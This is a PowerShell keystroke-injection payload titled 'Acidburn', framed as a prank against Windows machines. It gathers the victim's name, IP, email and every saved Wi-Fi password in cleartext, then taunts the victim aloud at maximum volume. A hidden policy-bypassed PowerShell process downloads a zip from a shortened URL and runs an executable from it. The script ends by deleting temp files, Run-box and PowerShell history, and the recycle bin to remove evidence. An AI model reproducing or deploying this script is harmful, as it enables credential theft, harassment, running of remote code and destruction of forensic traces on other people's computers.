#########################################################################################################################################
#                     #                  ;                                                                                              #
#                     #           :      ED.                                                      :                                     #
# Title: Acidburn     #          t#,     E#Wi             L.                      .        .     t#,     L.                             #
# Author: I-Am-Jakoby #         ;##W.    E###G.       t   EW:        ,ft         ;W       ;W    ;##W.    EW:        ,ft                 #
# Edited: 0d1nss0n    #        :#L:WE    E#fD#W;      Ej  E##;       t#E        f#E      f#E   :#L:WE    E##;       t#E                 #
# Category: Prank     #       .KG  ,#D   E#t t##L     E#, E###t      t#E      .E#f     .E#f   .KG  ,#D   E###t      t#E                 #
# Target: Win 7/10/11 #       EE    ;#f  E#t  .E#K,   E#t E#fE#f     t#E     iWW;     iWW;    EE    ;#f  E#fE#f     t#E                 #
# Mode: HID           #      f#.     t#i E#t    j##f  E#t E#t D#G    t#E    L##Lffi  L##Lffi f#.     t#i E#t D#G    t#E                 #
# Version: 2.1        #      :#G     GK  E#t    :E#K: E#t E#t  f#E.  t#E   tLLG##L  tLLG##L  :#G     GK  E#t  f#E.  t#E                 #
#                     #       ;#L   LW.  E#t   t##L   E#t E#t   t#K: t#E     ,W#i     ,W#i    ;#L   LW.  E#t   t#K: t#E                 #
#                     #        t#f f#:   E#t .D#W;    E#t E#t    ;#W,t#E    j#E.     j#E.      t#f f#:   E#t    ;#W,t#E                 #
#                     #         f#D#;    E#tiW#G.     E#t E#t     :K#D#E  .D#j     .D#j         f#D#;    E#t     :K#D#E                 #
#                     #          G#t     E#K##i       E#t E#t      .E##E ,WK,     ,WK,           G#t     E#t      .E##E                 #
#                     #           t      E##D.        E#t ..         G#E EG.      EG.             t      ..         G#E                 #
#                     #                  E#t          ,;.             fE ,        ,                                  fE                 #
#                     #                  L:                            ,                                              ,                 #
#########################################################################################################################################
# 
#   github.com/0d1nss0n
#
############################################################################################################################################################
#
# Original script made by I-Am-Jakoby // I only modified the parts that did not work for me to get all of the functions to operate. 
#
############################################################################################################################################################

# Variables


$s=New-Object -ComObject SAPI.SpVoice

############################################################################################################################################################

# Intro ---------------------------------------------------------------------------------------------------
# 0D1nss0n ---- had to update -Pattern "Full Name" to -Pattern "User Name" as no machine I tested had any value in the "Full Name" section. 

 function Get-fullName {

    try {

    $fullName = Net User $Env:username | Select-String -Pattern "User Name";$fullName = ("$fullName").TrimStart("User name")

    }
 
 # If no name is detected function will return $env:UserName 

    # Write Error is just for troubleshooting 
    catch {Write-Error "No name was detected" 
    return $env:UserName
    -ErrorAction SilentlyContinue
    }

    return $fullName 

}

$fullName = Get-fullName

# echo statement used to track progress while debugging
echo "Intro Done"

###########################################################################################################

<#
.NOTES 
	RAM Info
	This will get the amount of RAM the target computer has
#>


function Get-RAM {

    try {

    $OS = (Get-WmiObject Win32_OperatingSystem).Name;$OSpos = $OS.IndexOf("|");$OS = $OS.Substring(0, $OSpos)

    $RAM=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1}" -f ($_.sum / 1GB)}
    $RAMpos = $RAM.IndexOf('.')
    $RAM = [int]$RAM.Substring(0,$RAMpos).Trim()

# ENTER YOUR CUSTOM RESPONSES HERE
#----------------------------------------------------------------------------------------------------
    $lowRAM = "$RAM gigs of ram? really? What is this, 1999? Give me a break...."
    
    $okRAM = "$RAM gigs of ram? My phone has more memory than this piece of junk you call a PC..."
    
    $goodRAM = "$RAM gigs of ram? I bet you have a light up keyboard and a bucket seat gaming chair... you're a wannabe streamer huh?...."

    $impressiveRAM = "$RAM gigs of ram? are you serious? a super computer with no security that is funny right there"
#----------------------------------------------------------------------------------------------------

    if($RAM -le 4){
       return $lowRAM
    } elseif($RAM -ge 5 -and $RAM -le 12){
       return $okRAM
    } elseif($RAM -ge 13 -and $RAM -le 24){
       return $goodRAM
    } else {
       return $impressiveRAM
    }

    }
 
 # If one of the above parameters is not detected function will return $null to avoid sapi speak

    # Write Error is just for troubleshooting 
    catch {Write-Error "Error in search" 
    return $null
    -ErrorAction SilentlyContinue
    }
}

# echo statement used to track progress while debugging
echo "RAM Info Done"

###########################################################################################################

<#
.NOTES 
	Public IP 
	This will get the public IP from the target computer
#>


function Get-PubIP {

    try {

    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content

    }
 
 # If no Public IP is detected function will return $null to avoid sapi speak

    # Write Error is just for troubleshooting 
    catch {Write-Error "No Public IP was detected" 
    return $null
    -ErrorAction SilentlyContinue
    }

    return "your public  I P address is $computerPubIP"
}

# echo statement used to track progress while debugging
echo "Pub IP Done"

###########################################################################################################

<#
.NOTES 
	Wifi Network and Password
	This function will custom a tailor response based on how many characters long their password is
#>


function Get-Pass {

    #-----VARIABLES-----#
    # $pwl = their Pass Word Length
    # $pass = their Password 

    try {

    $pro = netsh wlan show interface | Select-String -Pattern ' SSID '; $pro = [string]$pro
    $pos = $pro.IndexOf(':')
    $pro = $pro.Substring($pos+2).Trim()

    $pass = netsh wlan show profile $pro key=clear | Select-String -Pattern 'Key Content'; $pass = [string]$pass
    $passPOS = $pass.IndexOf(':')
    $pass = $pass.Substring($passPOS+2).Trim()
    
    if($pro -like '*_5GHz*') {
      $pro = $pro.Trimend('_5GHz')
    } 

    $pwl = $pass.length


    }
 
 # If no network is detected function will return $null to avoid sapi speak
 
    # Write Error is just for troubleshooting
    catch {Write-Error "No network was detected" 
    return $null
    -ErrorAction SilentlyContinue
    }


# ENTER YOUR CUSTOM RESPONSES HERE
#----------------------------------------------------------------------------------------------------
    $badPASS = "$pro is not a very creative name but at least it is not as bad as your wifi password... only $pwl characters long? $pass ...? really..? $pass was the best you could come up with?"
    
    $okPASS = "$pro is not a very creative name but at least you are trying a little bit, your password is $pwl characters long, still trash though.. $pass ...? You can do better"
    
    $goodPASS = "$pro is not a very creative name but At least you are not a total fool... $pwl character long password actually is not bad, but it did not save you from me did it? no..it..did..not! $pass is a decent password though."
#----------------------------------------------------------------------------------------------------

    if($pass.length -lt 8) { return $badPASS

    }elseif($pass.length -gt 7 -and $pass.length -lt 12)  { return $okPASS

    }else { return $goodPASS

    }
}

# echo statement used to track progress while debugging
echo "Wifi pass Done"

###########################################################################################################

<#
.NOTES 
	All Wifi Networks and Passwords 
	This function will gather all current Networks and Passwords saved on the target computer
	They will be save in the temp directory to a file named with "$env:USERNAME-$(get-date -f yyyy-MM-dd)_WiFi-PWD.txt"
#>

Function Get-Networks {
# Get Network Interfaces
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 

# Get Wifi SSIDs and Passwords	
$WLANProfileNames =@()

#Get all the WLAN profile names
$Output = netsh.exe wlan show profiles | Select-String -pattern " : "

#Trim the output to receive only the name
Foreach($WLANProfileName in $Output){
    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
}
$WLANProfileObjects =@()

#Bind the WLAN profile names and also the password to a custom object
Foreach($WLANProfileName in $WLANProfileNames){

    #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
    try{
        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
    }Catch{
        $WLANProfilePassword = "The password is not stored in this profile"
    }

    #Build the object and add this to an array
    $WLANProfileObject = New-Object PSCustomobject 
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
    $WLANProfileObjects += $WLANProfileObject
    Remove-Variable WLANProfileObject
}
return $WLANProfileObjects
}

$Networks = Get-Networks


Add-Type @"
using System;
using System.Runtime.InteropServices;
public class PInvoke {
    [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
    [DllImport("gdi32.dll")] public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
}
"@
$hdc = [PInvoke]::GetDC([IntPtr]::Zero)
$w = [PInvoke]::GetDeviceCaps($hdc, 118) # width
$h = [PInvoke]::GetDeviceCaps($hdc, 117) # height

<#
.NOTES 
	This will take the image you generated and set it as the targets wall paper
#>

Function Set-WallPaper {
 
<#
 
    .SYNOPSIS
    Applies a specified wallpaper to the current user's desktop
    
    .PARAMETER Image
    Provide the exact path to the image
 
    .PARAMETER Style
    Provide wallpaper style (Example: Fill, Fit, Stretch, Tile, Center, or Span)
  
    .EXAMPLE
    Set-WallPaper -Image "C:\Wallpaper\Default.jpg"
    Set-WallPaper -Image "C:\Wallpaper\Background.jpg" -Style Fit
  
#>

 
param (
    [parameter(Mandatory=$True)]
    # Provide path to image
    [string]$Image,
    # Provide wallpaper style that you would like applied
    [parameter(Mandatory=$False)]
    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
    [string]$Style
)
 
$WallpaperStyle = Switch ($Style) {
  
    "Fill" {"10"}
    "Fit" {"6"}
    "Stretch" {"2"}
    "Tile" {"0"}
    "Center" {"0"}
    "Span" {"22"}
  
}
 
If($Style -eq "Tile") {
 
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
 
}
Else {
 
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
 
}
 
Add-Type -TypeDefinition @" 
using System; 
using System.Runtime.InteropServices;
  
public class Params
{ 
    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
    public static extern int SystemParametersInfo (Int32 uAction, 
                                                   Int32 uParam, 
                                                   String lpvParam, 
                                                   Int32 fuWinIni);
}
"@ 
  
    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
  
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
  
    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}

#############################################################################################################################################

Function Minimize-All
{
	$apps = New-Object -ComObject Shell.Application
	$apps.MinimizeAll()
}

#############################################################################################################################################


#############################################################################################################################################

Function WallPaper-Troll {

if (!$Networks) { Write-Host "variable is null" 
}else { 

	# This is the name of the file the networks and passwords are saved 

	$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_WiFi-PWD.txt"

	($Networks| Out-String) >> $Env:temp\$FileName

	$content = [IO.File]::ReadAllText("$Env:temp\$FileName")


# this is the message that will be coded into the image you use as the wallpaper

	$hiddenMessage = "`n`nGet Wrecked`n"

# this will be the name of the image you use as the wallpaper

	$ImageName = "hey $fullName"

<#
.NOTES  
	This will get take the information gathered and format it into a .jpg
#>

	Add-Type -AssemblyName System.Drawing

	$filename = "$env:tmp\foo.jpg" 
	$bmp = new-object System.Drawing.Bitmap $w,$h 
	$font = new-object System.Drawing.Font Consolas,18 
	$brushBg = [System.Drawing.Brushes]::Black 
	$brushFg = [System.Drawing.Brushes]::Lime 
	$graphics = [System.Drawing.Graphics]::FromImage($bmp) 
	$graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height) 
	$graphics.DrawString($content,$font,$brushFg,500,100) 
	$graphics.Dispose() 
	$bmp.Save($filename) 

# Invoke-Item $filename 

<#
.NOTES 
	This will take your hidden message and use steganography to hide it in the image you use as the wallpaper 
	Then it will clean up the files you don't want to leave behind
#>

	echo $hiddenMessage > $Env:temp\foo.txt
	cmd.exe /c copy /b "$Env:temp\foo.jpg" + "$Env:temp\foo.txt" "$Env:USERPROFILE\Desktop\$ImageName.jpg"

	rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue


#############################################################################################################################################


# This will open up notepad with all their saved networks and passwords and taunt them


	$s.Speak("wanna see something really cool?")
	Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Fit
	$s.Speak("Look at all your other passswords I got..")
	Start-Sleep -Seconds 1
	$s.Speak("These are the wifi passwords for every network you've ever connected to!")
	Start-Sleep -Seconds 1
	$s.Speak("I could send them to myself but i wont")

}

# echo statement used to track progress while debugging
echo "All Wifi Passes Done"
}


###########################################################################################################

<#
.NOTES 
	Password last Set
	This function will custom tailor a response based on how long it has been since they last changed their password
#>


 function Get-Days_Set {

    #-----VARIABLES-----#
    # $pls (password last set) = the date/time their password was last changed 
    # $days = the number of days since their password was last changed 

    try {
 
    $pls = net user $env:UserName | Select-String -Pattern "Password last" ; $pls = [string]$pls
    $plsPOS = $pls.IndexOf("e")
    $pls = $pls.Substring($plsPOS+2).Trim()
    $pls = $pls -replace ".{3}$"
    $time = ((get-date) - (get-date "$pls")) ; $time = [string]$time 
    $DateArray =$time.Split(".")
    $days = [int]$DateArray[0]
    }
 
 # If no password set date is detected funtion will return $null to cancel Sapi Speak

    # Write Error is just for troubleshooting 
    catch {Write-Error "Day password set not found" 
    return $null
    -ErrorAction SilentlyContinue
    }


# ENTER YOUR CUSTOM RESPONSES HERE 
#---------------------------------------------------------------------------------------------------- 
    $newPass = "$pls was the last time you changed your password... You changed your password $days days ago..   I have to applaud you.. at least you change your password often. Still did not stop me! "
    
    $avgPASS = "$pls was the last time you changed your password... it has been $days days since you changed your password, really starting to push it, i mean look i am here. that tells you something " 
    
    $oldPASS = "$pls was the last time you changed your password... it has been $days days since you changed your password, you were basically begging me to hack you, well here i am! "
#----------------------------------------------------------------------------------------------------      
    
    if($days -lt 45) { return $newPass

    }elseif($days -gt 44 -and $days -lt 182)  { return $avgPASS

    }else { return $oldPASS

    }
}

# echo statement used to track progress while debugging
echo "Pass last set Done"

###########################################################################################################

<#
.NOTES 
	Get Email
	This function will custom tailor a response based on what type of email the target has
#>

function Get-email {
    
    try {

    $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
    
    $emailpos = $email.IndexOf("@")
    
    $domain = $email.Substring($emailpos+1) #.TrimEnd(".com")

    }

# If no email is detected function will return backup message for sapi speak

    # Write Error is just for troubleshooting
    catch {Write-Error "An email was not found" 
    return "you're lucky you do not have your email connected to your account, I would have really had some fun with you then lol"
    -ErrorAction SilentlyContinue
    }
        
# ENTER YOUR CUSTOM RESPONSES HERE
#----------------------------------------------------------------------------------------------------
    $gmailResponse = "At least you use G Mail.. we should be friends. If you are down just email me back, ill message you at $email. That is your email right?"
    $yahooResponse = "a yahoo account seriously? you are either in your 50's or just got done doing some time, a lot of it.. $email .. this is sad"
    $hotmailResponse = "really?. you have a hotmail account? $email .. I am sending this to the f b I they need to check your hard drive"
    $otherEmailResponse = "I dead ass do not even know what this is.. $email .. hope you did not think it was safe"
#----------------------------------------------------------------------------------------------------

    if($email -like '*gmail*') { return $gmailResponse

    }elseif($email -like '*yahoo*')  { return $yahooResponse

    }elseif($email -like '*hotmail*')  { return $hotmailResponse
    
    }else { return $otherEmailResponse}


}

# echo statement used to track progress while debugging
echo "Email Done"

###########################################################################################################

<#
.NOTES 
	Messages
	This function will run all the previous functions and assign their outputs to variables
#>

$intro = "$fullName , welcome to the show. You are going to get a kick out of this..."

$RAMwarn = Get-RAM  

$PUB_IPwarn = Get-PubIP  

$PASSwarn = Get-Pass

$LAST_PASSwarn =  Get-Days_Set

$EMAILwarn = Get-email 

$OUTRO =  "My crime is that of curiosity.... 	and yours is that of needing better security protocols... later $fullName"

# echo statement used to track progress while debugging
echo "Speak Variables set"

###########################################################################################################

# This turns the volume up to max level--------------------------------------------------------------------

$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}

# echo statement used to track progress while debugging
echo "Volume to max level"

Minimize-All

###########################################################################################################

<#
.NOTES 
	These two snippets are meant to be used as indicators to let you know the script is set up and ready
	This will display a pop up window saying "hello $fullname"
	Or this makes the CapsLock indicator light blink however many times you set it to
	if you do not want the ready notice to pop up or the CapsLock light to blink comment them out below
#>

# a popup will be displayed before freezing the script while waiting for the cursor to move to continue the script
# else capslock light will blink as an indicator
$popmessage = "Hello $fullName"


$readyNotice = New-Object -ComObject Wscript.Shell;$readyNotice.Popup($popmessage)


# caps lock indicator light
$blinks = 3;$o=New-Object -ComObject WScript.Shell;for ($num = 1 ; $num -le $blinks*2; $num++){$o.SendKeys("{CAPSLOCK}");Start-Sleep -Milliseconds 250}



#-----------------------------------------------------------------------------------------------------------

<#
.NOTES 
	Then the script will be paused until the mouse is moved 
	script will check mouse position every indicated number of seconds
	This while loop will constantly check if the mouse has been moved 
	"CAPSLOCK" will be continously pressed to prevent screen from turning off
	it will then sleep for the indicated number of seconds and check again
	when mouse is moved it will break out of the loop and continue theipt
#>


Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
echo "it worked"

###########################################################################################################

# this is where your message is spoken line by line

$s=New-Object -ComObject SAPI.SpVoice

# This sets how fast Sapi Speaks

$s.Rate = -1

$s.Speak($intro)

$s.Speak($RAMwarn)

$s.Speak($PUB_IPwarn)

$s.Speak($PASSwarn)

#WallPaper-Troll

$s.Speak($LAST_PASSwarn)

$s.Speak($EMAILwarn)

$s.Speak($OUTRO)


###########################################################################################################
# this will launch the desktop goose and 

Start-Process powershell -ArgumentList '-w', 'h', '-NoP', '-NonI', '-Ep', 'Bypass', '-Command', '$G="$env:tmp"; iwr -Uri "https://t.ly/gJ5d" -O "$G\goose.zip"; Expand-Archive "$G\goose.zip" -Des $G -Force; . $G\Goose\GooseDesktop.exe'

###########################################################################################################

# this snippet will leave a message on your targets desktop 

$message = "`nMy crime is that of curiosity`nNow work on getting better with your security practices"

Add-Content $home\Desktop\PeaceOut.txt $message
###########################################################################################################

<#
.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

#----------------------------------------------------------------------------------------------------

# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 

Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

#If true, toggle CapsLock key, to ensure that the script doesn't fail
if ($caps -eq $true){

$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}
